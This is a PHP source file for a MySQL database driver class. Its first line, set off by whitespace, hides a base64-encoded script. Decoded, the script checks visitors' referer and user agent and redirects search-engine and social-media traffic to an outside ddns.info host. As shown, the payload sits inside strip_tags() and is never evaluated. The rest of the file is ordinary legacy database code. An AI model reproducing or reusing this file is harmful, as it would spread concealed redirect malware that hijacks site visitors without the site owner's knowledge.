<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

require_once(GENERIC_PATH."db/db.php");
require_once(GENERIC_PATH."utils/utils.php");

class db_mysql extends db {

  function db_mysql($db_server, $db_name, $db_user, $db_password) {

    parent::db($db_server, $db_name, $db_user, $db_password);

    $this->capabilities["last_id"]              = true;
    $this->capabilities["explain_plan"]         = true;
    $this->capabilities["count_by_resource"]    = true;
    $this->capabilities["query_limited_amount"] = true;
    $this->capabilities["query_from_offset"]    = true;

  }

  function connect($db_server, $db_name, $db_user, $db_password) {

    global $log;
    if (function_exists('mysql_pconnect') && defined('USE_PERSISTENT_DB_CONNECTION')) {
      $this->connection = mysql_pconnect($db_server, $db_user, $db_password, true);
    } else {  
      $this->connection = mysql_connect($db_server, $db_user, $db_password, true);
    }

    if (!$this->connection)
      if (get_config('db.connection_error_page'))
        set_config('db.connection_in_error', true);
      else
        critical_error("Can't connect to database $db_server");
    if (!mysql_select_db($db_name, $this->connection))
      if (get_config('db.connection_error_page'))
        set_config('db.connection_in_error', true);
      else
        critical_error("Can't select database $db_name: ".$this->get_last_error());

    if ($this->charset)
      $this->query("SET NAMES '".$this->charset."'");

    if (function_exists('mysql_get_server_info'))
      $this->version = mysql_get_server_info();

  }

  function get_last_error() {
  	 
    if (mysql_errno($this->connection)) {
      return mysql_errno($this->connection).": ".mysql_error($this->connection);
    }
  	 
  }

  function internal_query($sql) {
  	 
  	return @mysql_query($sql, $this->connection);
  	 
  }
  
  function internal_affected_rows() {
  	 
  	return @mysql_affected_rows($this->connection);
  	 
  }

  function internal_unbufered_query($sql) { 
  	
  	return @mysql_unbuffered_query($sql, $this->connection); 
  	
  }
  
  function internal_count($query) { 
  	
  	return mysql_num_rows($query); 
  	
  }
  
  function internal_num_row($query) { 
  	
  	return mysql_fetch_row($query); 
  	
  }
  
  function internal_row($query) {
  	 
  	if ($this->ignore_sql_errors) { 
  	  return @mysql_fetch_assoc($query); 
  	} else { 
  	  return mysql_fetch_assoc($query);
  	} 
  	
  }
  
  function last_id() {
  	 
  	return mysql_insert_id($this->connection);
  	 
  }

  function internal_field_defs($query) {

    $field_defs = array();
    $field_count = mysql_num_fields($query);
    for ($i=0; $i < $field_count; $i++)
      $field_defs[strtolower(mysql_field_name($query, $i))] = array( "length" => mysql_field_len($query, $i)
				                                                   , "type"   => mysql_field_type($query, $i)
				                                                   , "flags"  => mysql_field_flags($query, $i));
    return $field_defs;

  }

  function date_empty($date) { 

    return (($date == "0000-00-00") or ($date == "0000-00-00 00:00:00") or !$date);

  }

  function limit($sql, $from, $count) {

    return $sql." LIMIT $from, $count";

  }

  function internal_start_transaction() {
  	 
  	mysql_query("START TRANSACTION");
     
  }

  function internal_commit_transaction() {
  	 
  	mysql_query("COMMIT");
     
  }

  function internal_rollback_transaction() {
  	 
  	mysql_query("ROLLBACK");
     
  }
  
}

?>